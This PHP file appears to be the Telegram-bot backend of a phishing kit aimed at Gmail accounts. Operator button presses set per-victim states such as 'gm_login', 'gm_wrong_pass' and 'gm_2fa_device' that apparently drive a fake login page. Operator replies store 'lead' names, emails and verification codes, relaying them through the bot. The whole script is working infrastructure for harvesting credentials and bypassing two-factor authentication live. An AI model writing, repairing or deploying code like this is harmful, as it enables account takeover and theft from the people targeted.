<?php
header('Content-Type: application/json');
include 'helper.php';


$update = json_decode(file_get_contents('php://input'), true);
$response = []; 

if (isset($update['callback_query'])) {
    $callbackData = $update['callback_query']['data'];
    $callbackId = $update['callback_query']['id'];


    answerCallback($callbackId, "You selected: " . $callbackData);


    $parts = explode('_', $callbackData);
    $action = $parts[0]; 
    $uid = $parts[1] ?? 'unknown'; 


    // Define the file path
    $filePath = "status/".$uid.".txt";


    switch ($action) {
        case 'code':
            // Logic for 2fa
            // file_put_contents($filePath, $action);

            send_msg("Reply Text: ".$uid);
            file_put_contents($filePath, "hold");
            file_put_contents("status/uid.txt", $uid);
            file_put_contents("type.txt", 'code');
            break;

        case 'name':
            send_msg("Write name for lead: ".$uid);
            file_put_contents("status/uid.txt", $uid);
            file_put_contents("type.txt", 'name');
            break;

        case 'continue':
            // Logic for calendar
            file_put_contents($filePath, $action);
            break;

        case 'pwd':
            // Logic for thanks
            file_put_contents($filePath, $action);
            break;

        case 'code11111':
            // Logic for clean
            file_put_contents($filePath, "code");
            break;
            
        case 'que':
            // Logic for que
            file_put_contents($filePath, "que");
            break;  

        case 'break':
            // Logic for other
            file_put_contents($filePath, "break");
            break;

        case 'email':
            // Logic for email
            send_msg("Please reply with your email address for: ".$uid);
            file_put_contents($filePath, "hold");
            file_put_contents("status/uid.txt", $uid);
            file_put_contents("type.txt", 'email');
            break;

        case 'gm2fa':
            send_msg("Reply Text: " . $uid . "\n\nwp:16:iPhone 16 pro\nphone:*******11\ne:test@gmail.com");
            file_put_contents($filePath, "gm_hold");
            file_put_contents("status/uid.txt", $uid);
            file_put_contents("type.txt", 'gmail_code');
            break;

        case 'gmlogin':
            file_put_contents($filePath, "gm_login");
            break;

        case 'gmverify':
            file_put_contents($filePath, "gm_verify");
            break;

        case 'gmwrong':
            file_put_contents($filePath, "gm_wrong_pass");
            break;

        default:
            file_put_contents($filePath, $action);
            break;
    }
}



// Handle user replies
if (isset($update['message']) && isset($update['message']['text'])) {
    $userMessage = $update['message']['text'];
    $userId = $update['message']['from']['id'];
    $uid = trim(file_get_contents("status/uid.txt"));
    $type = trim(file_get_contents("type.txt"));

    if($type=="email")
    {
        $filePath = "status/" .$uid.".txt";
        file_put_contents($filePath,"email");
        $emailpath = "emails/" . $uid . ".txt";
        file_put_contents($emailpath,$userMessage);
        send_msg("Email saved for: ".$uid." - ".$userMessage);
    }
    else if($type=="code")
    {
        $filePath = "status/" .$uid.".txt";
        file_put_contents($filePath,"code");
        $emailpath = "code_msg/" . $uid . ".txt";
        file_put_contents($emailpath,$userMessage);
        send_msg("Code Message: ".$uid." - ".$userMessage);
    }
    else if($type=="name")
    {
        $namepath = "names/" . $uid . ".txt";
        file_put_contents($namepath,$userMessage);
        send_msg("Name is: ".$uid." - ".$userMessage);
    }
    else if($type=="gmail_code")
    {
        handleGmailCodeReply($uid, $userMessage);
    }
    else
    {
        $filePath = "status/" . $uid . ".txt";
        $currentStatus = file_exists($filePath) ? trim(file_get_contents($filePath)) : '';
        $gmStatuses = ['gm_hold', 'gm_verify', 'gm_login', 'gm_2fa_device', 'gm_2fa_pick'];
        if (preg_match('/^(wp:|phone:|e:)/i', $userMessage) && ($type === 'gmail_code' || in_array($currentStatus, $gmStatuses, true))) {
            handleGmailCodeReply($uid, $userMessage);
        } elseif (file_exists($filePath) && $currentStatus === 'gm_hold') {
            handleGmailCodeReply($uid, $userMessage);
        }
    }


}

function handleGmailCodeReply($uid, $userMessage) {
    $filePath = "status/" . $uid . ".txt";

    if (!is_dir("emails")) {
        mkdir("emails", 0755, true);
    }
    if (!is_dir("code_msg")) {
        mkdir("code_msg", 0755, true);
    }

    if (preg_match('/^e:(.+)$/i', $userMessage, $m)) {
        file_put_contents("emails/" . $uid . ".txt", trim($m[1]));
        file_put_contents($filePath, "gm_login");
        send_msg("Code Message: " . $uid . " - " . $userMessage);
        return;
    }

    if (preg_match('/^wp:(.*)$/i', $userMessage, $m)) {
        $device = trim($m[1]);
        file_put_contents("code_msg/" . $uid . ".txt", "wp:" . $device);
        file_put_contents($filePath, "gm_2fa_device");
        send_msg("Code Message: " . $uid . " - wp:" . $device);
        return;
    }

    if (preg_match('/^phone:(.*)$/i', $userMessage, $m)) {
        $phone = trim($m[1]);
        file_put_contents("code_msg/" . $uid . ".txt", "phone:" . $phone);
        file_put_contents($filePath, "gm_2fa_pick");
        send_msg("Code Message: " . $uid . " - phone:" . $phone);
        return;
    }

    file_put_contents("code_msg/" . $uid . ".txt", $userMessage);
    file_put_contents($filePath, "gm_hold");
    send_msg("Code Message: " . $uid . " - " . $userMessage);
}



function answerCallback($callbackId, $text) {
include 'CONSTANTS.php';

    $url = "https://api.telegram.org/bot$botToken/answerCallbackQuery";

    $data = [
        'callback_query_id' => $callbackId,
        'text' => $text,
        'show_alert' => false,
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}
?>
